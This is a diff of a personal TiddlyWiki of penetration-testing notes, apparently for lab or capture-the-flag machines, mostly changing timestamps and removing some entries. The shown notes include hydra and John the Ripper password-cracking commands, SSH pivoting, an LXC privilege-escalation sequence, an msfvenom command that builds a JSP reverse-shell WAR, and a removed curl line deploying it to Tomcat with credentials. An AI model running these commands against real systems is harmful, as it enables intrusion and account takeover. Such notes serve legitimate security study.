@@ -9676,7 +9676,7 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE." />
 <div created="20210810022253593" modified="20210825230930363" title="$:/state/toc/TableOfContents/Tech-Game Development--118161433">
 <pre>close</pre>
 </div>
-<div created="20211025131349392" list="[[Cyber Security]] Pivoting CrappyMakerProgrammer" modified="20211025134712912" title="$:/StoryList">
+<div created="20211025140115230" list="[[Cyber Security]] Pivoting CrappyMakerProgrammer" modified="20211025140120156" title="$:/StoryList">
 <pre></pre>
 </div>
 <div plugin-type="info" title="$:/temp/info-plugin" type="application/json">
@@ -11441,7 +11441,7 @@ Resources
 # https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst
 </pre>
 </div>
-<div created="20210927151908009" modified="20211025133133619" title="Password Cracking">
+<div created="20210927151908009" modified="20211012153117850" title="Password Cracking">
 <pre>```
 hydra -L &lt;users&gt; -P &lt;passwords.txt&gt; &lt;ip&gt; &lt;service eg. ssh&gt;
 eg. hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt
@@ -11467,15 +11467,8 @@ john &lt;password_hash/hash_list&gt;
 john -wordlist /path/to/wordlist -users=users.txt hashfile
 ```
 
-!! Zip 
 
-```
-zip2john secret.zip &gt; hash
-john -wordlist /path/to/wordlist hash
-```
-
-
-!! GPG Hashes
+! GPG Hashes
 
 Cracking GPG Key File
 
@@ -11756,12 +11749,12 @@ void OnTriggerExit(Collider coll)
 }
 ```</pre>
 </div>
-<div created="20210901152347409" modified="20211025135335900" title="Pivoting" type="">
+<div created="20210901152347409" modified="20211025140142078" title="Pivoting" type="">
 <pre>Pivoting is basically gaining access to other networks (that were initially inaccessible)
 
 !! SSH
 
-Forward remote port to local device
+Access remote port from local device
 
 ```
 ssh -L5901:127.0.0.1:5901 charix@10.10.10.84  
@@ -11794,7 +11787,7 @@ Referenced from [[here|https://infinitelogins.com/2021/02/20/using-metasploit-ro
 <div created="20211014102800712" modified="20211014102802344" title="Privesc - Linux Binaries">
 <pre>https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/</pre>
 </div>
-<div created="20210904164116778" modified="20211025134710185" title="Privilege Escalation">
+<div created="20210904164116778" modified="20211022023644873" title="Privilege Escalation">
 <pre>! Linux
 
 [[Privesc - Linux Binaries]]
@@ -11837,18 +11830,6 @@ lxc init bobImage bobVM -c security.privileged=true
 lxc config device add bobVM realRoot disk source=/ path=r
 lxc start bobVM
 lxc exec bobVM -- /bin/sh
-```
-
-!! Hidden Credentials
-
-Common directories
-# `/opt`, `/home`, `/etc`
-
-Hidden Networked Services
-
-```
-ps aux
-netstat -an -p tcp
 ```
 
 ! Windows
@@ -12101,10 +12082,8 @@ PRIORITY: Do CoSpace soon
 # First Layer Deep (Outline)
 # Sports</pre>
 </div>
-<div created="20211010111016770" modified="20211025132743771" title="Tomcat">
-<pre>https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat
-
-! Exploitation
+<div created="20211010111016770" modified="20211010113330473" title="Tomcat">
+<pre>! Exploitation
 
 
 !! Default passwords (HIGHLY LIKELY)
@@ -12126,12 +12105,6 @@ You can generate a reverse shell payload (`.war` file), and upload it at `/manag
 └─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.12 LPORT=1111 -f war &gt; shell.war
 Payload size: 1090 bytes
 Final size of war file: 1090 bytes
-```
-
-If the user is configured to be `manager-script` instead of `manager-gui`, can upload the `.war` file like so
-
-```
-curl -T &quot;shell.war&quot; &quot;http://tomcat:\$3cureP4s5w0rd123\!@10.10.10.194:8080/manager/text/deploy?path=/shell&quot;       
 ```
 
 !! CVEs
